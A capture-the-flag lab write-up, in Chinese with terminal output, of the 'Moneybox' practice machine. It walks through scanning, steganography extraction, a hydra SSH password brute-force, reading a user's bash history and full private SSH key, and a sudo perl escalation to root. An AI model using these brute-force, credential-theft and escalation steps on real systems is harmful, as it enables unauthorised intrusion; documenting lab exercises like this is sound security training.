###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Moneybox
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.195.230 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.195.230:21
Open 192.168.195.230:22
Open 192.168.195.230:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.204
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCWBZjFZOMKU5jDBL6SwW+89IV0wojGRFPnrSIyxVOp/N7sNSln6NttNOQu1gsC4Sp7WziJ+hL5Map7t7YWJ9Rj9lvcaQU48aTtTzEsL5T991Wm3ZNvZjS0yhSL9Scf6VGxoO0EGqV+z3Z1OMKU609bm8PLoNaxfNXl2zDRdyrAN3VBT4jp8zlgfaT0W4kKQJ9u77IiHXBOU+6JrBg1b4F9x/wYT6zXxtGjH3tJTF8g4E6Da2eHOWsq3ERd40M+Oi1v4Du3+bQRd3Z4KVDOQ1utmdyFI+HcrGxjIPqqRAP0h2PLLm4qh/QZBvPO8cAPUdduLLeqmFGn/qg/FP08nBgZ
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8xP+l2BvuK5pg2bEpcDV1GAoAI3kIpMznpUyfOJS29SF9N2XyYV1cvf0O8exXyxCs+RjVbk+8cxBs8K36CU=
|   256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ92TDnimudy2EtcS6I1ja1fGn+OBm3z2/8rxwcZknEH
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

ftp拿到一張圖`trytofind.jpg`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.195.230 

ftp> get trytofind.jpg
```

掃80port，看`http://192.168.195.230/blogs/`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ feroxbuster -u http://192.168.195.230 -q -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

200      GET       17l       88w      621c http://192.168.195.230/
301      GET        9l       28w      318c http://192.168.195.230/blogs => http://192.168.195.230/blogs/
```

![Moneybox_1.png](picture/Moneybox_1.png)

F12看到`the hint is the another secret directory is S3cr3t-T3xt`

看`http://192.168.195.230/S3cr3t-T3xt/`

![Moneybox_2.png](picture/Moneybox_2.png)

有`Secret Key 3xtr4ctd4t4`，extractdata

對剛剛那張圖用`steghide`
```
┌──(kali㉿kali)-[~/pgplay/Moneybox]
└─$ steghide extract -sf trytofind.jpg
Enter passphrase: 3xtr4ctd4t4
wrote extracted data to "data.txt".
```

```
## data.txt
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

用`hydra`再看看，得密碼`987654321`
```
┌──(kali㉿kali)-[~/pgplay/Moneybox]
└─$ hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.195.230                                             
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-12 05:18:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.195.230:22/
[22][ssh] host: 192.168.195.230   login: renu   password: 987654321
```

ssh登入`renu`的帳號，可以在`/home/renu`得local.txt
```
┌──(kali㉿kali)-[~/pgplay/Moneybox]
└─$ ssh renu@192.168.195.230
renu@192.168.195.230's password: 987654321

renu@MoneyBox:~$ cat local.txt
db13a787d0efd38a988094c1a6e9091c
```

看`history`，進到.ssh拿`id_rsa`
```
renu@MoneyBox:~$ cat /home/renu/.bash_history
cler
ls
ls -la
cd /home
ls
clear
cd
ls
ls -la
exit
clear
ls
ls -la
cd /home
ls
cd lily
ls
ls -la
clear
cd
clear
ssh-keygen -t rsa
clear
cd .ssh
ls
ssh-copy-id lily@192.168.43.80
clear
cd
cd -
ls -l
chmod 400 id_rsa
ls -l
ssh -i id_rsa lily@192.168.43.80
clear
ssh -i id_rsa lily@192.168.43.80
cd
clear
cd .ssh/
ls
ssh -i id_rsa lily@192.168.43.80
su lily
clear
cd
sudo apt install openssh
sudo apt update
sudo apt install openssh-server
sudo service ssh start
sudo service ssh status
clear
cd /etc/
ls
cd ssh
ls
nano ssh_config 
ls
nano sshd_config 
clear
cd
ls
ls -la
chsh bash
chsh
clear
su root
clear
sudo apt install openssh
su root
exit

renu@MoneyBox:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA0SBPbRBG0y9APu5/qHfbQowEmAFmNFwanKs8qm9qrDbCZwZvHATA
gTUpLboLaLPR2PYc0iJ5Dsw590YrWSV7nplwmrDrDOoAXLbuRg7i/PNnRYM/etjvU73Rey
SZvNniIla7EvGAlUKuN5ooFrOh1ybvgTa1W3H/sat+m4s4kGlQcvrxm4gj6TdCU67RuOPT
XTWXJdBQ5pZtmOp5R+NszOYQgtB0CYgcpnPyN+xtPVbVLGgqY4imsWWp4Jcm9vli0sZiX6
/hIRp1jqUL/dYXsV3eyHZSuoYVDn3+cjcZbyFcxtlRG7oLSV7pDEi1pNhYZxHQy6ggh12P
tVflxAfRdwAAA8hAXVfHQF1XxwAAAAdzc2gtcnNhAAABAQDRIE9tEEbTL0A+7n+od9tCjA
SYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM
6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq3
6biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09
VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2V
EbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3AAAAAwEAAQAAAQBmBYE6D8q9lDufd/LH
WVGaMXy8O1KFELna3J8H9rrvsPc+E6F45ciUQD8Kk8ylE7S4R7jfuvmcAn306EKVhve789
c/YDgLYM00bfnoK7MI/CXRf6okYFjBXcUocj6eJx1u6yjwoOi96H3dmlMcYB4APHpzayEm
r4KyRpvJfi3mJNjPLS2wNhotTlOKA3OYcuwq9PO5O3ftmAhd1m5YH91jSM/ykeRRe6jt7X
aAbKqnvPWoXQVIzhYKqET68R1fCC6/BWGFPYkxvjGiC+N0OgMI82UMDXyKN5/DMU1/vLhj
V98GkTL+X2fZYDnMpGSQjWIjMvjkZUfmDHYuwAdXPBFBAAAAgQChZCjF2uHbq2WgJETxHg
grXSQcneY0oCVJQIGezhyl7Lip5CNT9P/0VBp6CcGJ8UpzmygtIvchinWd4rqmOOVwkRsR
Mw78IgQuoTIzkxqBZ6nluk/PExFrIZNGxoD3PJgZ+9+3PLvhimeEW7BRpId9Mnyed6uwxi
f1N9tfY7cSLAAAAIEA7F4NEJiRghxMDDF1qySIzmstCat2m0y3quqOPJvt/zZBuD9X/C0q
GJXP9AvJsyoVZxCbSpESUlc0Y61bbCrhn48AEPly6KuM96zW8i3JW3d2G6TK38xzE2BrUx
6y0sAYv5IP9P5UP/kIxGCafr+bUJThIUwWAkbPiBzSjuBfCE8AAACBAOJ/Bas5s3M8iE1Z
7ZVt5tlGtN+9jTuxoqDP/9WuYAmKKlsu3KD1MGux6iF79MYlg7+8yKInTzuGTv/G3aD7Qf
YhsiLPQ/9JdHubK82FYXSOR5ssO6Jl25UM5j2naZBQzhyogIP+P0daIu/hqYdXoHzxYGgU
tTfxqrmU8rLImbJZAAAAC3JlbnVAZGViaWFuAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

在kali端使用ssh，可登入`lily`的帳號
```
┌──(kali㉿kali)-[~/pgplay/Moneybox]
└─$ sudo chmod 600 id_rsa

┌──(kali㉿kali)-[~/pgplay/Moneybox]
└─$ ssh -i id_rsa lily@192.168.195.230

lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl

```

查看[GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo)，得root後可在/root得proof.txt
```
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@MoneyBox:~# cat proof.txt
c76a8330131d0ee73cf517a3e9384008
```